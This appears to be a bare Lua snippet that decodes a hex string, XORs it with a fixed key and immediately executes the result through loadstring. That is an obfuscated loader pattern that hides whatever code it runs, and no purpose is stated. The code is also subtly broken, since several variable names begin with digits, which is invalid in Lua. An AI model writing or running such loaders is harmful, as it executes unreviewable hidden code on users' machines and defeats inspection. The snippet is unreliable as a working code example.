local gp7h6icye3c = "253d2d1e6196d27301c301e2336221b146e2281361030c22152c3719281bd1152a8b47462b28218241029835413f19e7c1b2ca323a2622152c37192830c5c11292d2d42619343a832d172a32521e2a1f307f3632731293d321d2c19307f363244f3f1c5a1e4471639362620c162df44294423f31792b162656311e3c23202331222ca3a2d31b123d3f191829"
    local function ste2ncl4d6i()
      local 3zxmit057wu = ""
      for i = 1, #gp7h6icye3c, 2 do
        local byte = tonumber(gp7h6icye3c:sub(i, i + 1), 16)
        3zxmit057wu = 3zxmit057wu .. string.char(byte)
      end
      local xorKey = "secretXORKey"
      local decoded = ""
      for i = 1, #3zxmit057wu do
        decoded = decoded .. string.char(3zxmit057wu:byte(i) ~ xorKey:byte((i-1)%#xorKey+1))
      end
      return decoded
    end

    local decodedScript = loadstring(ste2ncl4d6i())()
    print(decodedScript)
  